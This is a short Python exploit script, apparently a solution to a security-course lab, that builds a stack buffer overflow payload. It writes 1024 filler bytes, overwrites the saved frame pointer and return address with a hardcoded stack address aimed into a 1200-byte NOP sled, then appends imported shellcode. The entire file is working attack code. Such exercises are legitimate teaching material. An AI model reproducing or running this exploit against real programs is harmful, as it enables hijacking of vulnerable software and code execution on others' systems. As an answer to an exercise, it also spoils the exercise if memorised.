#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
buf_size = 1024
esp_ret = 0xfffef4e4

sled = 1200
target = esp_ret + 4 + (sled // 2)

payload = b"A" * buf_size
payload += b"B" * 4
payload += pack("<I", target)
payload += b"\x90" * sled
payload += shellcode

sys.stdout.buffer.write(payload)
